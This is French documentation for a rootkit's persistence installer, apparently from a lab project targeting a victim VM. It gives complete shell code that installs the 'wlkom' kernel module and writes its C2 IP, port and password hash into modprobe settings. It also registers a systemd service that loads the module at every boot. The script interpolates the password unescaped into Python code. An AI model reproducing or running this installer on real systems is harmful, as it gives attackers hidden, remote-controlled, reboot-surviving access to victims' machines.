# install_persistence.sh — Le script d'installation

`rootkit/install_persistence.sh` automatise l'installation du module kernel comme service systemd sur la VM Victime. Il est conçu pour être lancé une seule fois après compilation, avec les droits root.

---

## Structure du script

Le script prend deux arguments positionnels :

```bash
sudo ./install_persistence.sh <c2_ip> <c2_port>
```

### 1. Vérifications initiales

```bash
[ "$EUID" -ne 0 ] && echo "Run as root" && exit 1
[ ! -f "wlkom.ko" ] && echo "wlkom.ko not found" && exit 1
```

Le script refuse de s'exécuter sans root (le déplacement de fichiers dans `/lib/modules/` et la création de services systemd nécessitent root) et sans le `.ko` compilé dans le répertoire courant.

### 2. Saisie du mot de passe en interactif

```bash
read -s -p "WLKOM password: " password
echo
```

`-s` désactive l'écho. Le mot de passe n'apparaît pas à l'écran pendant la saisie. C'est une précaution basique : quelqu'un qui regarde par-dessus l'épaule ne voit pas le mot de passe tapé.

### 3. Calcul du hash FNV-1a

```bash
hash=$(python3 -c "
h = 2166136261
for c in '$password':
    h = ((h ^ ord(c)) * 16777619) & 0xFFFFFFFF
print(f'{h:08x}')
")
```

On réimplémente FNV-1a en Python one-liner. Python 3 est présent sur la VM Victime (pré-installé avec Debian 12). Cette ligne produit exactement le même hash que `fnv1a_hash` dans `c2.c`. La vérification est possible manuellement en comparant les deux résultats pour un mot de passe connu.

### 4. Installation du module dans le système

```bash
cp wlkom.ko /lib/modules/$(uname -r)/extra/
depmod -a
```

`depmod -a` reconstruit l'index des modules du kernel. Sans ça, `modprobe wlkom` ne trouverait pas le module même s'il est dans le bon répertoire.

### 5. Écriture de la configuration modprobe

```bash
cat > /etc/modprobe.d/wlkom.conf << EOF
options wlkom password_hash=$hash c2_ip=$c2_ip c2_port=$c2_port
EOF
```

`/etc/modprobe.d/wlkom.conf` est le mécanisme standard pour passer des paramètres à un module kernel. Quand `modprobe wlkom` est invoqué, il lit ce fichier et passe les paramètres automatiquement. C'est ce qui permet au service systemd de charger le module sans spécifier les paramètres explicitement.

### 6. Création du service systemd

```bash
cat > /etc/systemd/system/wlkom.service << EOF
[Unit]
Description=WLKOM
After=network-online.target
Wants=network-online.target

[Service]
Type=oneshot
ExecStart=/sbin/modprobe wlkom
ExecStop=/sbin/modprobe -r wlkom
RemainAfterExit=yes

[Install]
WantedBy=multi-user.target
EOF
```

Les choix de `After=network-online.target`, `Type=oneshot` et `RemainAfterExit=yes` sont justifiés dans [Décisions → Persistance](../decisions/persistence.md).

### 7. Activation du service

```bash
systemctl enable wlkom.service
```

`enable` crée un lien symbolique dans `/etc/systemd/system/multi-user.target.wants/` qui fait démarrer le service automatiquement à chaque boot.

---

## Ce que le script ne fait pas

Le script n'est pas idempotent : relancer `install_persistence.sh` une deuxième fois écrase silencieusement la configuration existante avec les nouvelles valeurs. C'est un comportement attendu. Si on change de mot de passe ou d'IP C2, on relance le script.
